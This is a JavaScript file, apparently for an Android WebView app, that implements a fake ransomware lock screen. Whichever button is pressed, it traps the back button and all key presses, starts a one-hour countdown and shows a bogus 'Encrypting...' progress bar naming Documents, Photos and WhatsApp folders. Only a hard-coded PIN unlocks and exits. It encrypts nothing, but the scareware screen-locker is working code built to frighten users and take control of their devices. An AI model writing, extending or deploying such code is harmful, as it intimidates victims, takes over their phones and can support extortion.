// made by https://t.me/halilintardev
const CORRECT_PIN = "1234";
let navLocked = false;
let countdown;

function handlePopState() {
  if (navLocked) {
    history.pushState(null, "", location.href);
  }
}

function handleKeyDown(e) {
  if (navLocked) {
    e.preventDefault();
    e.stopPropagation();
    return false;
  }
}

function lockNavigation() {
  navLocked = true;
  history.pushState(null, "", location.href);
  history.pushState(null, "", location.href);
  window.addEventListener("popstate", handlePopState);
  document.addEventListener("keydown", handleKeyDown, true);
  try { window.Android.lockBack(); } catch(e) {}
}

function unlockNavigation() {
  navLocked = false;
  window.removeEventListener("popstate", handlePopState);
  document.removeEventListener("keydown", handleKeyDown, true);
  try { window.Android.unlockBack(); } catch(e) {}
}

function exitApp() {
  unlockNavigation();
  try { window.Android.exitApp(); } catch(e) {}
}

function startCountdown() {
  let total = 3600;
  const el = document.getElementById("timer");
  countdown = setInterval(() => {
    total--;
    const h = String(Math.floor(total/3600)).padStart(2,"0");
    const m = String(Math.floor((total%3600)/60)).padStart(2,"0");
    const s = String(total%60).padStart(2,"0");
    if (el) el.textContent = h+":"+m+":"+s;
    if (total <= 0) clearInterval(countdown);
  }, 1000);
}

function simulateProgress() {
  let pct = 0;
  const bar = document.getElementById("progress");
  const status = document.getElementById("status");
  const files = document.getElementById("files");
  const fakeFiles = ["Documents/","Photos/","Videos/","Downloads/","WhatsApp/"];
  let fi = 0;
  const iv = setInterval(() => {
    pct += Math.random() * 3;
    if (pct > 100) pct = 100;
    if (bar) bar.style.width = pct + "%";
    if (fi < fakeFiles.length && pct > fi * 20) {
      if (files) files.innerHTML += "<div>🔒 " + fakeFiles[fi] + "</div>";
      fi++;
    }
    if (pct >= 100) {
      clearInterval(iv);
      if (status) status.textContent = "Encryption complete.";
      const btn = document.getElementById("decryptBtn");
      if (btn) btn.removeAttribute("disabled");
    } else {
      if (status) status.textContent = "Encrypting... " + Math.floor(pct) + "%";
    }
  }, 80);
}

window.onload = function() {
  const welcomeDialog = document.getElementById("welcomeDialog");
  const mainApp = document.getElementById("mainApp");
  const yesBtn = document.getElementById("yesBtn");
  const noBtn = document.getElementById("noBtn");
  const decryptBtn = document.getElementById("decryptBtn");
  const pinInput = document.getElementById("pinInput");
  const pinOverlay = document.getElementById("pinOverlay");
  const closePinOverlay = document.getElementById("closePinOverlay");

  if (noBtn) noBtn.addEventListener("click", () => {
    if (welcomeDialog) welcomeDialog.style.display = "none";
    if (mainApp) mainApp.style.display = "block";
    lockNavigation();
    startCountdown();
    simulateProgress();
  });

  if (yesBtn) yesBtn.addEventListener("click", () => {
    if (welcomeDialog) welcomeDialog.style.display = "none";
    if (mainApp) mainApp.style.display = "block";
    lockNavigation();
    startCountdown();
    simulateProgress();
  });

  if (closePinOverlay) closePinOverlay.addEventListener("click", () => {
    if (pinOverlay) pinOverlay.setAttribute("hidden", "");
  });

  if (decryptBtn) decryptBtn.addEventListener("click", () => {
    if (pinInput && pinInput.value === CORRECT_PIN) {
      clearInterval(countdown);
      exitApp();
    } else {
      if (pinOverlay) pinOverlay.removeAttribute("hidden");
    }
  });
};
